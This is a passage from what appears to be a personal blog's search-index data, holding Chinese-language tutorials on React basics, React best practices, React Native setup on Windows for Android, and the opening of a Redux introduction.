parentheses.\r\u0026lt;/div\u0026gt;\r); JSX 的所有标签都可以自闭合：\u0026lt;div/\u0026gt; const JSX = (\r\u0026lt;div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r//or\rconst JSX = (\r\u0026lt;div/\u0026gt;\r); 二、Component 组件(大写字母开头定义) 组件是 React 的核心。 React 中的所有内容都是一个组件。\n有两种方法可以创建 React 组件。\n第一种方法是使用 JavaScript 函数。 以这种方式定义组件会创建无状态功能组件（Hooks 组件可以有状态）。\n要用函数创建组件，只需编写一个返回 JSX 或 null 的 JavaScript 函数。 需要注意的一点是，React 要求你的函数名以大写字母开头。\n1. 无状态组件（Hook中称为函数组件） function MyComponent(){\rreturn(\r\u0026lt;div\u0026gt;Completed challenge!\u0026lt;/div\u0026gt; //记得返回JSX\r);\r} 2. class 组件 （ES6 语法糖） class Kitten extends React.Component {\rconstructor(props) {\rsuper(props); //super(props)作用是调用父类的构造函数React.Component\r}\rrender() {//render(): 渲染JSX的方法\rreturn (\r\u0026lt;h1\u0026gt;Hi\u0026lt;/h1\u0026gt;\r);\r}\r} 3. 组合/嵌套组件 //将子组件放入父组件中\rclass Fruits extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Fruits:\u0026lt;/h2\u0026gt;\r\u0026lt;NonCitrus /\u0026gt;\r\u0026lt;Citrus /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass TypesOfFood extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Types of Food:\u0026lt;/h1\u0026gt;\r\u0026lt;Fruits /\u0026gt;\r\u0026lt;Vegetables /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 三、props 1. 传递方式 \u0026ndash; 单向数据流 在 React 中，可以将属性传递给子组件。单向数据流\nfunction 组件\nconst CurrentDate = (props) =\u0026gt; {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;The current date is: {props.date}\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r};\rclass Calendar extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;What date is it?\u0026lt;/h3\u0026gt;\r\u0026lt;CurrentDate date={Date()} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; class 组件\nclass App extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;Welcome name=\u0026#34;Jessica\u0026#34;/\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass Welcome extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Hello, \u0026lt;strong\u0026gt;{this.props.name}\u0026lt;/strong\u0026gt;!\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 2. 默认 props React 还有一个设置默认 props 的选项。\n可以将默认 props 作为组件本身的属性分配给组件，React 会在必要时分配默认 prop。\n如果没有显式的提供任何值，这允许指定 prop 值应该是什么。\nconst ShoppingCart = (props) =\u0026gt; {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Shopping Cart Component\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r};\rShoppingCart.defaultProps = {\ritems: 0\r}; 3. propTypes \u0026amp; PropTypes React 提供了有用的类型检查特性，以验证组件是否接收了正确类型的 props。\n例如，应用程序调用 API 来检索数据是否是数组，然后将数据作为 prop 传递给组件。\n可以在组件上设置 propTypes，以要求数据的类型为 array。 当数据是任何其它类型时，都会抛出警告。\nconst Items = (props) =\u0026gt; {\rreturn \u0026lt;h1\u0026gt;Current Quantity of Items in Cart: {props.quantity}\u0026lt;/h1\u0026gt;\r};\rItems.propTypes = {\rquantity: PropTypes.number.isRequired //其中number为类型；isRequired为必须\r};\rItems.defaultProps = {\rquantity: 0\r};\rclass ShoppingCart extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn \u0026lt;Items /\u0026gt;\r}\r}; 四、state React 中最重要的主题之一是 state。\nstate 包含应用程序需要了解的任何数据，这些数据可能会随时间而变化。\n应用程序能够响应 state 的变更，并在必要时显示更新后的 UI。\nReact 为现代 Web 应用程序的状态管理提供了一个很好的解决方案。\n可以在类组件的 constructor 上声明 state 属性来在 React 组件中创建 state， 它在创建时使用 state 初始化组件。\nstate 属性必须设置为 JavaScript object（对象）\n1. 初始化状态this.state={} class StatefulComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rname: \u0026#34;Name\u0026#34;\r}\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;{this.state.name}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 2. 设置状态this.setState() React 要求永远不要直接修改 state，而是在 state 发生改变时始终使用 this.setState()。\n此外，应该注意，React 可以批量处理多个 state 更新以提高性能。\n这意味着通过 setState 方法进行的 state 更新可以是异步的。\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rname: \u0026#39;Initial State\u0026#39;\r};\rthis.handleClick = this.handleClick.bind(this);\r}\rhandleClick() {\rthis.setState({\rname: \u0026#39;React Rocks!\u0026#39;\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.handleClick}\u0026gt;Click Me\u0026lt;/button\u0026gt;\r\u0026lt;h1\u0026gt;{this.state.name}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 3. 使用 state 切换元素 有时可能在更新状态的时候想知道上一个状态是什么。\n但是状态更新是异步的，这意味着 React 可能会把多个 setState() 集中在一起批量更新。\n所以计算下一个值时 this.state 或者 this.props 不能作为当前值。\n正确的做法是，给 setState 传入一个函数，这个函数可以访问 state 和 props。 给 setState 传入函数可以保证 state 和 props 是正确的值。\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rvisibility: false\r};\rthis.toggleVisibility = this.toggleVisibility.bind(this);\r}\rtoggleVisibility() {\rthis.setState(state =\u0026gt; {\rif (state.visibility === true) {\rreturn { visibility: false };\r} else {\rreturn { visibility: true };\r}\r});\r}\rrender() {\rif (this.state.visibility) {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleVisibility}\u0026gt;Click Me\u0026lt;/button\u0026gt;\r\u0026lt;h1\u0026gt;Now you see me!\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} else {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleVisibility}\u0026gt;Click Me\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}\r} 五、将 this 绑定到 class 方法上 为组件类定义方法。 类方法通常需要使用 this 关键字，以便它可以访问方法中类的属性（例如 state 和 props）。 有几种方法可以让类方法访问 this。\n一种常见的方法是在构造函数中显式地绑定 this，这样当组件初始化时，this 就会绑定到类方法。\n在构造函数中的 handleClick 方法使用了 this.handleClick = this.handleClick.bind(this)。 然后，当在类方法中调用像 this.setState() 这样的函数时，this 指的是这个类，而不是 undefined。\n注意： this 关键字是 JavaScript 中最令人困惑的方面之一，但它在 React 中扮演着重要的角色。\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rtext: \u0026#34;Hello\u0026#34;\r};\rthis.handleClick = this.handleClick.bind(this);\r}\rhandleClick() {\rthis.setState({\rtext: \u0026#34;You clicked!\u0026#34;\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.handleClick}\u0026gt;Click Me\u0026lt;/button\u0026gt;\r\u0026lt;h1\u0026gt;{this.state.text}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 六、将 state 作为 props 传递给子组件（重要） 有状态组件中包含对应用程序很重要的 state，然后用它渲染子组件。 如果想让这些组件能够访问该 state 的某些部分，就把这些部分作为 props 传入。\n这个模式说明了 React 中的一些重要范例。\n第一个是单向数据流， state 沿着应用程序组件树的一个方向流动，从有状态父组件到子组件， 子组件只接收它们需要的 state 数据。\n第二，复杂的有状态应用程序可以分解成几个，或者可能是一个单一的有状态组件。 其余组件只是从父组件简单的接收 state 作为 props，并从该 state 渲染 UI。\n它开始创建一种分离，在这种分离中，state 管理在代码的一部分中处理，而 UI 渲染在另一部分中处理。 将 state 逻辑与 UI 逻辑分离是 React 的关键原则之一。\n当它被正确使用时，它使得复杂的、有状态的应用程序的设计变得更容易管理。\nclass MyApp extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinputValue: \u0026#39;\u0026#39;\r}\rthis.handleChange = this.handleChange.bind(this);\r}\rhandleChange(event) {\rthis.setState({\rinputValue: event.target.value\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;GetInput\rinput={this.state.inputValue}\rhandleChange={this.handleChange}/\u0026gt;\r\u0026lt;RenderInput\rinput={this.state.inputValue}/\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass GetInput extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;Get Input:\u0026lt;/h3\u0026gt;\r\u0026lt;input\rvalue={this.props.input}\ronChange={this.props.handleChange}/\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass RenderInput extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;Input Render:\u0026lt;/h3\u0026gt;\r\u0026lt;p\u0026gt;{this.props.input}\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 七、生命周期方法/钩子 React 组件有几种特殊方法，可以在组件生命周期的特定点执行操作。 这些称为生命周期方法或生命周期钩子，允许在特定时间点捕获组件。\n这可以在渲染之前、更新之前、接收 props 之前、卸载之前等等。\n以下是一些主要生命周期方法的列表：\ncomponentWillMount() 渲染之前\ncomponentDidMount() 接收 props 之前\nshouldComponentUpdate() 更新之前\ncomponentDidUpdate() 更新之后\ncomponentWillUnmount() 卸载之前\n1. componentWillMount 当组件被挂载到 DOM 时，componentWillMount() 方法在 render() 方法之前被调用。\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rcomponentWillMount() {\rconsole.log(\u0026#39;Component being mounted\u0026#39;);\r}\rrender() {\rreturn \u0026lt;div /\u0026gt;\r}\r}; 2. componentDidMount React 的最佳实践是在生命周期方法 componentDidMount() 中对服务器进行 API 调用或任何其它调用。\n将组件装载到 DOM 后会调用此方法。 此处对 setState() 的任何调用都将触发组件的重新渲染。\n在此方法中调用 API 并用 API​​ 返回的数据设置 state 时，一旦收到数据，它将自动触发更新。\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\ractiveUsers: null\r};\r}\rcomponentDidMount() {\rsetTimeout(() =\u0026gt; {\rthis.setState({\ractiveUsers: 1273\r});\r}, 2500);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Active Users: {this.state.activeUsers}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r} 3. 添加事件侦听器 componentDidMount() 方法是添加特定功能所需的任何事件监听器的最佳位置。\nReact 提供了一个合成事件系统，它封装了浏览器中的事件系统。 这意味着，不管用户用的是什么浏览器，合成事件系统的行为都完全相同 \u0026ndash; 即使不同浏览器之间的本地事件的行为可能不同。\n之前已经接触了一些合成事件处理程序，如 onClick()。 React 的合成事件系统非常适合用于在 DOM 元素上管理的大多数交互。 但是，如果要将事件处理程序附加到 document 或 window 对象，则必须直接执行此操作。\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rmessage: \u0026#39;\u0026#39;\r};\rthis.handleEnter = this.handleEnter.bind(this);\rthis.handleKeyPress = this.handleKeyPress.bind(this);\r}\rcomponentDidMount() {\rdocument.addEventListener(\u0026#34;keydown\u0026#34;, this.handleKeyPress);\r}\rcomponentWillUnmount() {\rdocument.removeEventListener(\u0026#34;keydown\u0026#34;, this.handleKeyPress);\r}\rhandleEnter() {\rthis.setState((state) =\u0026gt; ({\rmessage: state.message + \u0026#39;You pressed the enter key! \u0026#39;\r}));\r}\rhandleKeyPress(event) {\rif (event.keyCode === 13) {\rthis.handleEnter();\r}\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;{this.state.message}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 4. 使用 shouldComponentUpdate 优化重新渲染 当子组件接收到新的 state 或 props 时，可以调用该方法，并特别声明组件是否应该更新。\n它将 nextProps 和 nextState 作为参数。\n这种方法是优化性能的有效方法。 例如，默认行为是，当组件接收到新的 props 时，即使 props 没有改变，它也会重新渲染。\n可以通过使用 shouldComponentUpdate() 比较 props 来防止这种情况发生。\n该方法必须返回一个 boolean（布尔值），该值告诉 React 是否更新组件。 可以比较当前的 props（this.props）和下一个 props（nextProps），以确定你是否需要更新，并相应地返回 true 或 false。\nclass OnlyEvens extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rshouldComponentUpdate(nextProps, nextState) {\rconsole.log(\u0026#39;Should I update?\u0026#39;);\rif (nextProps.value % 2 == 0) {\rreturn true;\r}\rreturn false;\r}\rcomponentDidUpdate() {\rconsole.log(\u0026#39;Component re-rendered.\u0026#39;);\r}\rrender() {\rreturn \u0026lt;h1\u0026gt;{this.props.value}\u0026lt;/h1\u0026gt;;\r}\r}\rclass Controller extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rvalue: 0\r};\rthis.addValue = this.addValue.bind(this);\r}\raddValue() {\rthis.setState(state =\u0026gt; ({\rvalue: state.value + 1\r}));\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.addValue}\u0026gt;Add\u0026lt;/button\u0026gt;\r\u0026lt;OnlyEvens value={this.state.value} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r} 八、CSS 样式（驼峰写法） 1. 内联样式 class Colorful extends React.Component {\rrender() {\rreturn (\r\u0026lt;div style={{ color: \u0026#39;red\u0026#39;, fontSize: \u0026#39;72\u0026#39;}}\u0026gt;\rBig Red\r\u0026lt;/div\u0026gt;\r);\r}\r}; 2. 常量引用 const styles = {\rcolor: \u0026#39;purple\u0026#39;,\rfontSize: 40,\rborder: \u0026#34;2px solid purple\u0026#34;,\r};\rclass Colorful extends React.Component {\rrender() {\rreturn (\r\u0026lt;div style={styles}\u0026gt;Style Me!\u0026lt;/div\u0026gt;\r);\r}\r}; 九、按条件渲染组件 1. if\u0026hellip;else.. class MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rdisplay: true\r}\rthis.toggleDisplay = this.toggleDisplay.bind(this);\r}\rtoggleDisplay() {\rthis.setState((state) =\u0026gt; ({\rdisplay: !state.display\r}));\r}\rrender() {\rif (this.state.display) {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleDisplay}\u0026gt;Toggle Display\u0026lt;/button\u0026gt;\r\u0026lt;h1\u0026gt;Displayed!\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} else {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleDisplay}\u0026gt;Toggle Display\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}\r}; 2. \u0026amp;\u0026amp; class MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rdisplay: true\r}\rthis.toggleDisplay = this.toggleDisplay.bind(this);\r}\rtoggleDisplay() {\rthis.setState(state =\u0026gt; ({\rdisplay: !state.display\r}));\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleDisplay}\u0026gt;Toggle Display\u0026lt;/button\u0026gt;\r{this.state.display \u0026amp;\u0026amp; \u0026lt;h1\u0026gt;Displayed!\u0026lt;/h1\u0026gt;}\r\u0026lt;/div\u0026gt;\r);\r}\r}; 3. 三元表达式 const inputStyle = {\rwidth: 235,\rmargin: 5\r}\rclass CheckUserAge extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\ruserAge: \u0026#39;\u0026#39;,\rinput: \u0026#39;\u0026#39;\r}\rthis.submit = this.submit.bind(this);\rthis.handleChange = this.handleChange.bind(this);\r}\rhandleChange(e) {\rthis.setState({\rinput: e.target.value,\ruserAge: \u0026#39;\u0026#39;\r});\r}\rsubmit() {\rthis.setState(state =\u0026gt; ({\ruserAge: state.input\r}));\r}\rrender() {\rconst buttonOne = \u0026lt;button onClick={this.submit}\u0026gt;Submit\u0026lt;/button\u0026gt;;\rconst buttonTwo = \u0026lt;button\u0026gt;You May Enter\u0026lt;/button\u0026gt;;\rconst buttonThree = \u0026lt;button\u0026gt;You Shall Not Pass\u0026lt;/button\u0026gt;;\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;Enter Your Age to Continue\u0026lt;/h3\u0026gt;\r\u0026lt;input\rstyle={inputStyle}\rtype=\u0026#34;number\u0026#34;\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\u0026lt;br /\u0026gt;\r{\rthis.state.userAge === \u0026#39;\u0026#39;\r? buttonOne\r: this.state.userAge \u0026gt;= 18\r? buttonTwo\r: buttonThree\r}\r\u0026lt;/div\u0026gt;\r);\r}\r}; 4. 根据props有条件地渲染 class Results extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;h1\u0026gt;\r{this.props.fiftyFifty ? \u0026#34;You Win!\u0026#34; : \u0026#34;You Lose!\u0026#34;}\r\u0026lt;/h1\u0026gt;\r)\r};\r};\rclass GameOfChance extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rcounter: 1\r}\rthis.handleClick = this.handleClick.bind(this);\r}\rhandleClick() {\rthis.setState({\rcounter: this.state.counter + 1\r});\r}\rrender() {\rconst expression = Math.random() \u0026gt;= 0.5 ? true : false\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.handleClick}\u0026gt;Play Again\u0026lt;/button\u0026gt;\r\u0026lt;Results fiftyFifty={expression} /\u0026gt;\r\u0026lt;p\u0026gt;{\u0026#39;Turn: \u0026#39; + this.state.counter}\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 5. 根据state有条件地渲染 class GateKeeper extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: \u0026#39;\u0026#39;\r};\rthis.handleChange = this.handleChange.bind(this);\r}\rhandleChange(event) {\rthis.setState({ input: event.target.value })\r}\rrender() {\rlet inputStyle = {\rborder: \u0026#39;1px solid black\u0026#39;\r};\rif (this.state.input.length \u0026gt; 15) {\rinputStyle.border = \u0026#39;3px solid red\u0026#39;;\r}\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;Don\u0026#39;t Type Too Much:\u0026lt;/h3\u0026gt;\r\u0026lt;input\rtype=\u0026#34;text\u0026#34;\rstyle={inputStyle}\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 十、Array.map()渲染数组 const frontEndFrameworks = [\r\u0026#39;React\u0026#39;,\r\u0026#39;Angular\u0026#39;,\r\u0026#39;Ember\u0026#39;,\r\u0026#39;Knockout\u0026#39;,\r\u0026#39;Backbone\u0026#39;,\r\u0026#39;Vue\u0026#39;\r];\rfunction Frameworks() {\rconst renderFrameworks = frontEndFrameworks.map((item, index) =\u0026gt;\r\u0026lt;li key={index}\u0026gt;{item}\u0026lt;/li\u0026gt;\r);\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Popular Front End JavaScript Frameworks\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{renderFrameworks}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}; 十一、Array.Filter() 动态过滤数组 class MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rusers: [\r{\rusername: \u0026#39;Jeff\u0026#39;,\ronline: true\r},\r{\rusername: \u0026#39;Alan\u0026#39;,\ronline: false\r},\r{\rusername: \u0026#39;Mary\u0026#39;,\ronline: true\r},\r{\rusername: \u0026#39;Jim\u0026#39;,\ronline: false\r},\r{\rusername: \u0026#39;Sara\u0026#39;,\ronline: true\r},\r{\rusername: \u0026#39;Laura\u0026#39;,\ronline: true\r}\r]\r}\r}\rrender() {\rconst usersOnline = this.state.users.filter(user =\u0026gt; user.online === true);\rconst renderOnline = usersOnline.map(user =\u0026gt; \u0026lt;li key={user.username}\u0026gt;{user.username}\u0026lt;/li\u0026gt;);\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Current Online Users:\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{renderOnline}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 十二、用 renderToString 在服务器上渲染 React 有两个关键原因可以解释为什么服务器上的渲染可能会在真实世界的应用程序中使用。\n首先，如果不这样做，当 React 应用程序最初加载到浏览器时，它将包含一个代码量很少的 HTML 文件和一大堆 JavaScript。 这对于搜索引擎来说可能不太理想，因为它们试图为网页内容生成索引，以便人们可以找到这个应用。 如果在服务器上渲染初始 HTML 标记并将其发送到客户端，则初始页面加载的内容包含搜索引擎可以抓取的所有页面标记。\n其次，这创造了更快的初始页面加载体验，因为渲染的 HTML 代码量要比整个应用程序的 JavaScript 代码小。 React 仍然能够识别你的应用并在初始加载后进行管理。\nclass App extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn \u0026lt;div/\u0026gt;\r}\r};\rReactDOMServer.renderToString(\u0026lt;App /\u0026gt;); ","description":"React 的基础内容，不再会在项目中使用class组件","id":19,"section":"react","tags":null,"title":"React 基础","uri":"https://codthing.github.io/react/react/react-base/"},{"content":"React 是一个声明式、高效且灵活的 JavaScript 库\n一、特性   虚拟 DOM：保存在内存中并通过 ReactDOM 等库与“真实”DOM 同步的 UI 表示。使用这种方法，只有实际更改的组件才会更新到 DOM，而不是所有组件。\n  声明式：声明式视图使代码更可预测和易于调试。\n  基于 CDD 开发模式\n  跨平台 React-Native\n  区别于命令式，这里拿 for 举例\n1 2 3 4 5 6 7 8 9 10  //命令式，我称之为松散式 let n = [-9, 87, 72, 452, 32, -9]; for (let i = 0; i \u0026lt; n.length; i++) { console.log(n[i]); } //声明式（函数式，封装性更好） let n = [-9, 87, 72, 452, 32, -9]; n.forEach((v) =\u0026gt; console.log(v));   二、目录结构 拿 nextjs 举例\n pages  index.tsx   components  button.component.tsx   public  favicon.ico   styles  global.module.css    三、Hooks  Hooks 让你无需编写类即可使用状态和其他 React 功能。 不适用于基于类的组件。  #. 调用 Hooks  不要在循环、条件或嵌套函数中调用 Hook。此外，永远不要从常规 JavaScript 函数调用 Hook。它们应该从 React 功能组件的顶层中调用。  #. 使用 ESLint 插件 可以使用 eslint-plugin-react-hooks 强制从 React 功能组件中和自定义 Hook 中调用 Hook。\n1 2  yarn add --dev eslint-plugin-react-hooks   1 2 3 4 5 6 7 8 9 10 11 12 13  //ESLint 配置 { \u0026#34;plugins\u0026#34;: [ // ...  \u0026#34;react-hooks\u0026#34; ], \u0026#34;rules\u0026#34;: { // ...  \u0026#34;react-hooks/rules-of-hooks\u0026#34;: \u0026#34;error\u0026#34;, // 检查 Hooks 的规则  \u0026#34;react-hooks/exhaustive-deps\u0026#34;: \u0026#34;warn\u0026#34; // 检查 effect 依赖  } }   三、表单验证  react-hook-form Formik kendo-react-form  四、JSX 速记  当使用 props 控制组件可见性时  1 2 3 4  showRatings={true} \u0026lt;Reviews showRatings /\u0026gt;   五、类型检查  使用 React.PropTypes  1 2 3 4 5 6 7 8 9  const MyComponent = (props) =\u0026gt; { const { username } = props; return \u0026lt;div\u0026gt;{props.name}\u0026lt;/div\u0026gt;; }; PropTypeMyComponent.PropTypes = { name: PropTypes.string.isRequired, };    使用 TypeScript (首推)  1 2 3 4 5 6 7 8  interface props { username?: string; } const Mycomponent = ({ username }: props) =\u0026gt; { return \u0026lt;div\u0026gt;{username}\u0026lt;/div\u0026gt;; };   六、使用 Memo 提升性能 React.Memo 高阶组件环绕组件以记住渲染的输出并跳过不必要的渲染。\n1 2 3 4  const ChildrenComponent = React.memo(({userName}) =\u0026gt; { return \u0026lt;div\u0026gt;{userName}\u0026lt;/div\u0026gt; })   七、使用 Fragments / \u0026lt;\u0026gt;\u0026lt;/\u0026gt; React 中的一个常见模式是一个组件返回多个元素。\nFragments 允许你将子列表分组，而无需向 DOM 添加额外节点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  return ( \u0026lt;React.Fragment\u0026gt; \u0026lt;ChildA /\u0026gt; \u0026lt;ChildB /\u0026gt; \u0026lt;ChildC /\u0026gt; \u0026lt;/React.Fragment\u0026gt; ); // or 短语法  return ( \u0026lt;\u0026gt; \u0026lt;ChildA /\u0026gt; \u0026lt;ChildB /\u0026gt; \u0026lt;ChildC /\u0026gt; \u0026lt;/\u0026gt; )   ","description":"会时常更新，因为React的发展很快且社区很庞大","id":20,"section":"react","tags":null,"title":"React 最佳实践","uri":"https://codthing.github.io/react/react/react-bp/"},{"content":"开发平台：Windows\n目标平台：Android\nReactNative 版本：0.62.2\n一、安装依赖  Node (\u0026gt;=12) Python2 (Windows x86 MSI installer) Java SE Development Kit (JDK) (1.8 版本) 注意：要最新版本，要时常更新 Yarn (下载比 npm 快)  npm install -g yarn Android Studio (只用依赖，不要用来设置设备，因为非常吃计算机系统盘容量和性能)  //1. 安装界面中选择\u0026#34;Custom\u0026#34;选项，确保选中了以下几项：\rAndroid SDK\rAndroid SDK Platform\r//然后点击\u0026#34;Next\u0026#34;来安装选中的组件。\r//2. 欢迎界面中点击\u0026#34;Configure\u0026#34;，在 SDK Manager 中。\r// 1). 选择\u0026#34;SDK Platforms\u0026#34;选项卡，然后在右下角勾选\u0026#34;Show Package Details\u0026#34;。\r// 展开Android 9 (pie)选项，确保勾选了下面这些组件：\rAndroid SDK Platform 28\r// 2). 选择\u0026#34;SDK Tools\u0026#34;选项卡，同样勾中右下角的\u0026#34;Show Package Details\u0026#34;。\r// 展开\u0026#34;Android SDK Build-Tools\u0026#34;选项，确保选中了 React Native 所必须的：\r28.0.3 （版本）\r// 3). 最后点击\u0026#34;Apply\u0026#34;来下载和安装这些组件。 配置环境变量  //1. 创建ANDROID_HOME环境变量（系统或用户变量均可）\rANDROID_HOME\rC:\\Users\\Administrator\\AppData\\Local\\Android\\Sdk\r//2. 环境变量 Path 中添加以下工具目录\r%ANDROID_HOME%\\platform-tools\r%ANDROID_HOME%\\emulator\r%ANDROID_HOME%\\tools\r%ANDROID_HOME%\\tools\\bin 二、安装模拟器 //模拟器是基于虚拟机运行，所以运行性能良好\rGenymotion 模拟器 //平常只开启这个就可以了，不用手动去启动VirtualBox虚拟机;可以点击debug用Chrome浏览器做调试也可以。\rVirtualBox 虚拟机\r//两者都安装好以后，创建安卓设备，如果遇到打开不了设备，则Genymotion恢复出厂设置/重启电脑，多试几次，才能正常打开设备\r//留意电脑是否开启了支持虚拟设备，如果没有则去到Bios设置开启 三、创建项目并编译 //1.创建项目\rnpx react-native init MyApp --template react-native-template-typescript\r//2.安装依赖\ryarn install\r//3.启动 Metro Bundle(Metro是RN的打包工具)\ryarn start\r//4.将在模拟器或任何连接的 android 设备上构建并打开应用。\ryarn android //或者 yarn react-native run-android ","description":"","id":21,"section":"react-native","tags":null,"title":"React-Native 基础","uri":"https://codthing.github.io/react-native/react-native/rn-base/"},{"content":"Redux 是一个状态管理框架，\n但我觉得它同时也是一门语言，因为它有自己的一套行事规则。\nRedux 代码库本身很小，核心概念也很简洁明了，但是它的 “语言” 却不寻常，\n加之 Redux 已经有一段历史了，需要了解它的一个技术变革过程，这样才能更好的理解它和使用它。\n一、了解 Redux 1. 动机 前端逻辑变得越来越复杂，\n这种复杂性很难处理，因为人类大脑很难推理两个概念：突变和异步。\nReact 通过删除异步和直接操作DOM来解决视图层中的这个问题。\n但是，管理数据的状态由开发者决定。这就是 Redux 进入的地方。\n2. 三大原则（核心内容） 1). 单一数据源 应用的全局状态存储在单个store内的对象树中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  console.log(store.getState()) /* Prints { visibilityFilter: \u0026#39;SHOW_ALL\u0026#39;, todos: [ { text: \u0026#39;Consider using Redux\u0026#39;, completed: true, }, { text: \u0026#39;Keep all state in a single tree\u0026#39;, completed: false } ] } */   2). 状态是只读的 改变状态的唯一方法是发出一个Action动作，它是描述 “发生了什么” 的字面量对象。\n1 2 3 4 5 6 7 8 9 10  store.dispatch({ type: \u0026#39;COMPLETE_TODO\u0026#39;, index: 1 }) store.dispatch({ type: \u0026#39;SET_VISIBILITY_FILTER\u0026#39;, filter: \u0026#39;SHOW_COMPLETED\u0026#39; })   3). 使用纯函数进行更改（状态副本） 编写纯 reducers 函数，它接受 前一个状态 和一个 动作，然后 